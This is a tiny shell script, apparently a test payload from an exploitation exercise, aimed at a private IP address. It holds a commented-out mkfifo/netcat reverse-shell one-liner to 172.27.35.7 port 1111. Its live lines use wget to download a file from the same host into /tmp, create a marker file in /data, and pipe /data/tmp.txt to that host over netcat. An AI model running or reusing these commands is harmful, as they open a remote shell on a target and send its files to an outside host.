#!/bin/sh

#mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.27.35.7 1111 >/tmp/f

/bin/wget -O /tmp/wgettest8888 http://172.27.35.7:8000/wgettest
/bin/touch /data/test8888
/usr/bin/nc 172.27.35.7 8888 < /data/tmp.txt
